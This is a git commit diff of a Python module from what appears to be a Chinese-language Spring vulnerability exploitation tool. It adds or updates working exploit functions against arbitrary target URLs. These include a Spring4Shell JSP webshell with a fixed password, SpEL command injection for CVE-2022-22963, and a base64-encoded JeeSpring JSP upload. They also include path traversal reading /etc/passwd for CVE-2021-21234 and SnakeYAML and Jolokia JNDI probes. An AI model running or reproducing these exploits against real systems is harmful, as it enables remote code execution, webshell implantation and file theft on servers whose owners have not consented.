3571aadfc30b4b82055f42d98a256f41b385b6b7
曾哥 <54609266+AabyssZG@users.noreply.github.com>
2023-11-19 20:02:36 +0800

    Update vul.py

--- inc/vul.py
+++ inc/vul.py
@@ -1,14 +1,13 @@
 #!/usr/bin/env python
 # coding=utf-8
 
-import requests, sys, json, re, random
+import requests, sys, json, re, random, base64
 from termcolor import cprint
 from time import sleep
 import urllib3
 urllib3.disable_warnings()
 
-ua = [
-      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
+ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36",
       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (X11; NetBSD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
       "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36",
@@ -17,7 +16,7 @@ ua = [
       "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00"]
 
 def CVE_2022_22965(url, proxies):
-    cprint("================开始对目标URL进行CVE-2022-22965漏洞利用================", "green")
+    cprint("======开始对目标URL进行CVE-2022-22965漏洞利用======", "green")
     Headers_1 = {
         "User-Agent": random.choice(ua),
         "suffix": "%>//",
@@ -53,18 +52,18 @@ def CVE_2022_22965(url, proxies):
                 result = re.findall('([^\x00]+)\n', resp)[0]
                 cprint(result ,"green")
         else:
-            cprint("[-] CVE-2022-22965漏洞不存在或者已经被利用,shell地址请手动尝试访问 [/tomcatwar.jsp?pwd=aabysszg&cmd=命令] \n","yellow")
+            cprint("[-] CVE-2022-22965漏洞不存在或者已经被利用,shell地址请手动尝试访问：\n[/tomcatwar.jsp?pwd=aabysszg&cmd=命令] \n","yellow")
     except KeyboardInterrupt:
         print("Ctrl + C 手动终止了进程")
         sys.exit()
     except Exception as e:
         print("[-] 发生错误，已记入日志error.log\n")
         f2 = open("error.log", "a")
-        f2.write(e + '\n')
+        f2.write(str(e) + '\n')
         f2.close()
 
 def CVE_2022_22963(url, proxies):
-    cprint("================开始对目标URL进行CVE-2022-22963漏洞利用================", "green")
+    cprint("======开始对目标URL进行CVE-2022-22963漏洞利用======", "green")
     payload = f'T(java.lang.Runtime).getRuntime().exec("whoami")'
 
     data = 'test'
@@ -89,8 +88,7 @@ def CVE_2022_22963(url, proxies):
             cprint(f'[+] {url} 存在编号为CVE-2022-22963的RCE漏洞，请手动反弹Shell', "red")
             print('\n')
         else:
-            cprint("[-] CVE-2022-22963漏洞不存在", "yellow")
-            print('\n')
+            cprint("[-] CVE-2022-22963漏洞不存在\n", "yellow")
     except KeyboardInterrupt:
         print("Ctrl + C 手动终止了进程")
         sys.exit()
@@ -101,7 +99,7 @@ def CVE_2022_22963(url, proxies):
         f2.close()
 
 def CVE_2022_22947(url, proxies):
-    cprint("================开始对目标URL进行CVE-2022-22947漏洞利用================","green")
+    cprint("======开始对目标URL进行CVE-2022-22947漏洞利用======","green")
     headers1 = {
         'Accept-Encoding': 'gzip, deflate',
         'Accept': '*/*',
@@ -161,8 +159,154 @@ def CVE_2022_22947(url, proxies):
                     cprint(result ,"green")
                     print('\n')
         else:
-            cprint("[-] CVE-2022-22947漏洞不存在", "yellow")
-            print('\n')
+            cprint("[-] CVE-2022-22947漏洞不存在\n", "yellow")
+    except KeyboardInterrupt:
+        print("Ctrl + C 手动终止了进程")
+        sys.exit()
+    except Exception as e:
+        print("[-] 发生错误，已记入日志error.log\n")
+        f2 = open("error.log", "a")
+        f2.write(str(e) + '\n')
+        f2.close()
+
+def JeeSpring_2023(url,proxies):
+    cprint("======开始对目标URL进行2023JeeSpring任意文件上传漏洞利用======","green")
+    headers1 = {
+        'User-Agent': random.choice(ua),
+        'Content-Type': 'multipart/form-data;boundary=----WebKitFormBoundarycdUKYcs7WlAxx9UL',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apn g,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'Accept-Language': 'zh-CN,zh;q=0.9,ja;q=0.8',
+        'Connection': 'close'
+    }
+
+    payload2 = b'LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5Y2RVS1ljczdXbEF4eDlVTA0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJmaWxlIjsgZmlsZW5hbWU9ImxvZy5qc3AiDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbQ0KDQo8JSBvdXQucHJpbnRsbigiSGVsbG8gV29ybGQiKTsgJT4NCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWNkVUtZY3M3V2xBeHg5VUwtLQo='
+    payload = base64.b64decode(payload2)
+    path = 'static/uploadify/uploadFile.jsp?uploadPath=/static/uploadify/'
+    
+    try:
+        requests.packages.urllib3.disable_warnings()
+        re1 = requests.post(url=url + path, data=payload, headers=headers1, verify=False, proxies=proxies)
+        code1 = re1.status_code
+        if ('jsp' in str(re1.text)) and (int(code1) == 200):
+            cprint("[+] Payload已经发送，成功上传JSP", "red")
+            newpath = str(re1.text)
+            urltest = url + "static/uploadify/" + newpath.strip()
+            retest = requests.get(url=urltest, verify=False, proxies=proxies)
+            code2 = retest.status_code
+            if ('Hello' in str(retest.text)) and (code2 == 200):
+                cprint(f'[+] {url} 存在2023JeeSpring任意文件上传漏洞，Poc地址如下：', "red")
+                cprint(urltest + '\n', "red")
+            else:
+                cprint(f'[.] 未发现Poc存活，请手动验证： {urltest}', "yellow")
+        else:
+            cprint("[-] 2023JeeSpring任意文件上传漏洞不存在\n", "yellow")
+    except KeyboardInterrupt:
+        print("Ctrl + C 手动终止了进程")
+        sys.exit()
+    except Exception as e:
+        print("[-] 发生错误，已记入日志error.log\n")
+        f2 = open("error.log", "a")
+        f2.write(str(e) + '\n')
+        f2.close()
+
+def JolokiaRCE(url,proxies):
+    cprint("======开始对目标URL进行Jolokia系列RCE漏洞测试======","green")
+    path1 = 'jolokia'
+    path2 = 'actuator/jolokia'
+    path3 = 'jolokia/list'
+    
+    try:
+        requests.packages.urllib3.disable_warnings()
+        re1 = requests.post(url=url + path1, timeout=10, allow_redirects=False, verify=False, proxies=proxies)
+        code1 = re1.status_code
+        re2 = requests.post(url=url + path2, timeout=10, allow_redirects=False, verify=False, proxies=proxies)
+        code2 = re2.status_code
+        if ((int(code1) == 200) or (int(code2) == 200)):
+            cprint("[+] 发现jolokia相关路径状态码为200，进一步验证", "red")
+            retest = requests.get(url=url + path3, timeout=10, verify=False, proxies=proxies)
+            code3 = retest.status_code
+            if ('reloadByURL' in str(retest.text)) and (code3 == 200):
+                cprint(f'[+] {url} 存在Jolokia-Logback-JNDI-RCE漏洞，Poc地址如下：', "red")
+                cprint(url + path3 + '\n', "red")
+            elif ('createJNDIRealm' in str(retest.text)) and (code3 == 200):
+                cprint(f'[+] {url} 存在Jolokia-Realm-JNDI-RCE漏洞，Poc地址如下：', "red")
+                cprint(url + path3 + '\n', "red")
+            else:
+                cprint(f'[.] 未发现jolokia/list路径存在关键词，请手动验证：', "yellow")
+                cprint(url + path3 + '\n', "red")
+        else:
+            cprint("[-] Jolokia系列RCE漏洞不存在\n", "yellow")
+    except KeyboardInterrupt:
+        print("Ctrl + C 手动终止了进程")
+        sys.exit()
+    except Exception as e:
+        print("[-] 发生错误，已记入日志error.log\n")
+        f2 = open("error.log", "a")
+        f2.write(str(e) + '\n')
+        f2.close()
+
+def CVE_2021_21234(url,proxies):
+    cprint("======开始对目标URL进行CVE-2021-21234漏洞测试======","green")
+    payload1 = 'manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../'
+    payload2 = 'log/view?filename=/windows/win.ini&base=../../../../../../../../../../'
+    payload3 = 'manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../'
+    payload4 = 'log/view?filename=/etc/passwd&base=../../../../../../../../../../'
+
+    try:
+        requests.packages.urllib3.disable_warnings()
+        re1 = requests.post(url=url + payload1, verify=False, proxies=proxies)
+        re2 = requests.post(url=url + payload2, verify=False, proxies=proxies)
+        re3 = requests.post(url=url + payload3, verify=False, proxies=proxies)
+        re4 = requests.post(url=url + payload4, verify=False, proxies=proxies)
+        if (('MAPI' in str(re1.text)) or ('MAPI' in str(re2.text))):
+            cprint("[+] 发现Spring Boot目录遍历漏洞且系统为Win，Poc路径如下：", "red")
+            cprint(url + payload1, "red")
+            cprint(url + payload2 + '\n', "red")
+        elif (('root:x:' in str(re3.text)) or ('root:x:' in str(re4.text))):
+            cprint(f'[+] 发现Spring Boot目录遍历漏洞且系统为Linux，Poc路径如下：', "red")
+            cprint(url + payload3, "red")
+            cprint(url + payload4 + '\n', "red")
+        else:
+            cprint("[-] 未发现Spring Boot目录遍历漏洞\n", "yellow")
+    except KeyboardInterrupt:
+        print("Ctrl + C 手动终止了进程")
+        sys.exit()
+    except Exception as e:
+        print("[-] 发生错误，已记入日志error.log\n")
+        f2 = open("error.log", "a")
+        f2.write(str(e) + '\n')
+        f2.close()
+
+def SnakeYAML_RCE(url,proxies):
+    cprint("======开始对目标URL进行SnakeYAML RCE漏洞测试======","green")
+    Headers_1 = {
+        "User-Agent": random.choice(ua),
+        "Content-Type": "application/x-www-form-urlencoded"
+        }
+    Headers_2 = {
+        "User-Agent": random.choice(ua),
+        "Content-Type": "application/json"
+        }
+    payload_1 = "spring.cloud.bootstrap.location=http://127.0.0.1/example.yml"
+    payload_2 = "{\"name\":\"spring.main.sources\",\"value\":\"http://127.0.0.1/example.yml\"}"
+    path = 'env'
+    
+    try:
+        requests.packages.urllib3.disable_warnings()
+        urltest = url + path
+        re1 = requests.post(url=urltest, headers=Headers_1, data=payload_1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
+        re2 = requests.post(url=urltest, headers=Headers_2, data=payload_2, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
+        if ('example.yml' in str(re1.text)):
+            cprint("[+] 发现SnakeYAML-RCE漏洞，Poc为Spring 1.x：", "red")
+            cprint('漏洞存在路径为 ' + urltest + '\n', "red")
+            cprint('POST数据包内容为 ' + payload_1 + '\n', "red")
+        elif ('example.yml' in str(re2.text)):
+            cprint("[+] 发现SnakeYAML-RCE漏洞，Poc为Spring 2.x：", "red")
+            cprint('漏洞存在路径为 ' + urltest + '\n', "red")
+            cprint('POST数据包内容为 ' + payload_2 + '\n', "red")
+        else:
+            cprint("[-] 未发现SnakeYAML-RCE漏洞\n", "yellow")
     except KeyboardInterrupt:
         print("Ctrl + C 手动终止了进程")
         sys.exit()
@@ -173,23 +317,12 @@ def CVE_2022_22947(url, proxies):
         f2.close()
 
 def vul(url,proxies):
-    if ('://' not in url):
-        url = str("http://") + str(url)
-    if str(url[-1]) != "/":
-        url = url + "/"
-    try:
-        requests.packages.urllib3.disable_warnings()
-        r = requests.get(url, timeout=6, verify=False, proxies=proxies)  # 设置超时6秒
-        if r.status_code == 503:
-            sys.exit()
-    except KeyboardInterrupt:
-        print("Ctrl + C 手动终止了进程")
-        sys.exit()
-    except:
-        cprint("[-] URL为 " + url + " 的目标积极拒绝请求，予以跳过！", "magenta")
-        sys.exit()
-    CVE_2022_22947(url ,proxies)
-    CVE_2022_22963(url ,proxies)
-    CVE_2022_22965(url ,proxies)
+    CVE_2021_21234(url, proxies)
+    CVE_2022_22947(url, proxies)
+    CVE_2022_22963(url, proxies)
+    CVE_2022_22965(url, proxies)
+    SnakeYAML_RCE(url, proxies)
+    JolokiaRCE(url,proxies)
+    JeeSpring_2023(url, proxies)
     cprint("后续会加入更多漏洞利用模块，请师傅们敬请期待~", "red")
     sys.exit()
